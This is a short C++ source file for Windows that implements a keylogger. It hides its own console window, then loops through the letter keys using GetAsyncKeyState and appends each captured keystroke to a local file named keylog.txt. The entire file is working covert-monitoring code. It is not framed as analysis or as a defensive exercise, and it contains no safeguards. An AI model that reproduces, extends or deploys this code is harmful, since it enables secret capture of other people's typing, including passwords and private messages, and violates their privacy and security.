#include <iostream>
#include <fstream>
#include <windows.h>

bool key_state[256] = {false}; // array to track key states
char key_char = ' ';

void hideConsole(){
    // get the console window handle
    HWND consoleWindow = GetConsoleWindow(); 

    // check if console window handle retrieved
    if (consoleWindow != NULL) {
        ShowWindow(consoleWindow, SW_HIDE); // hide console
    }else{ exit(1); }
}

int main(){

    hideConsole();

    std::ofstream keylog("keylog.txt", std::ios::app); // open or create a text file in append mode

    // if the file didn't open, shut the program down
    if (!keylog.is_open()){
        return 1;
    }

    // loop to continuously track key inputs
    while (true) {

        // check each key
        for (int key = 65; key <= 90; key++) {

            // check if key pressed
            if (GetAsyncKeyState(key) == -32767 ) {
                
                // Check if the key was not already registered as pressed
                if (!key_state[key]) {

                    key_char = MapVirtualKey(key, 2); 
                    
                    keylog << key_char;
                    keylog.flush(); // flush the output to the file

                    std::cout << key_char << std::endl;

                    key_state[key] = true;
                }
            } else {
                // update the key state if not pressed
                key_state[key] = false;
            }   
        }
        // Add a delay to avoid high CPU usage
        Sleep(100);
    } 

    keylog.close();
   

    return 0;
}